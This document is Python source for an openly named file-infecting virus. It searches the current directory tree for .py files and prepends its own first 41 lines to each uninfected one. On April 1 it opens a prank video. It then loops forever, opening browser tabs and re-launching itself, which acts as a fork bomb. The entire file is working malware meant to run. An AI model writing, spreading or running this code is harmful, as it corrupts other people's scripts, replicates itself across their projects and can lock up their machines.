import os, datetime, inspect, webbrowser, pathlib, os
DATA_TO_INSERT = "#get HACKED"
def search(path): #search for target files in path
    filestoinfect = []
    filelist = os.listdir(path)
    for filename in filelist:
        if os.path.isdir(path+"/"+filename): #If it is a folder
            filestoinfect.extend(search(path+"/"+filename))
        elif filename[-3:] == ".py": #If it is a python script -> Infect it
            infected = False #default value
            for line in open(path+"/"+filename):
                if DATA_TO_INSERT in line:
                    infected = True
                    break
            if infected == False:
                 filestoinfect.append(path+"/"+filename)
    return filestoinfect
def infect(filestoinfect): #changes to be made in the target file
    target_file = inspect.currentframe().f_code.co_filename
    virus = open(os.path.abspath(target_file))
    virusstring = ""
    for i,line in enumerate(virus):
        if i>=0 and i <41:
            virusstring += line
    virus.close
    for fname in filestoinfect:
         f = open(fname)
         temp = f.read()
         f.close()
         f = open(fname,"w")
         f.write(virusstring + temp)
         f.close()
def explode():
      if datetime.datetime.now().month == 4 and datetime.datetime.now().day == 1:
             print ("GET FRICKED I HACKED YOU AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
             webbrowser.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ')
def getfucked():

    eatFood = pathlib.Path().absolute()
    while True:
        webbrowser.open("https://www.youtube.com/watch?v=1yOWszgwejs")
        os.system(f'python3 {__file__}')

filestoinfect = search(os.path.abspath(""))
infect(filestoinfect)
explode()
getfucked()
